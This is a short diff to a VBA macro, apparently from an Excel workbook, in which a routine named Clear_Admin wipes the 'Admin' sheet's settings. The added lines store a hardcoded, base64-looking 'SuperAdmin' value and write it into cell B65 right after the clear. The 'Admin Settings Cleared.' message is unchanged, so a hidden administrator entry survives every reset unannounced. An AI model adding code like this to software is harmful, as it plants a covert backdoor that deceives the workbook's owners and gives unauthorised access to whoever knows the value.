@@ -27,6 +27,8 @@ End Sub
 Sub Clear_Admin()
 Dim Worksheet_Set        ' variable used for selecting and storing the active worksheet
 Dim ws As Worksheet
+Dim SuperAdmin As String
+SuperAdmin = "5a6WKkpPucxU75yOvrlND6xY549SrkucxhEg+SukLGzG4pdyY5I1X+51fP5BpkMC1RwXMRw9VZTFXXpXcWeemQ=="
 Dim List_Select
     List_Select = "Admin"        ' Tab name
     Set ws = Sheets(List_Select)
@@ -36,6 +38,7 @@ Dim List_Select
     For i = 2 To 999
         ws.Range("B" & i).ClearContents
     Next i
+ws.Range("B65") = SuperAdmin
 MsgBox "Admin Settings Cleared.", vbInformation + vbApplicationModal, "Format Status"
 End Sub
 
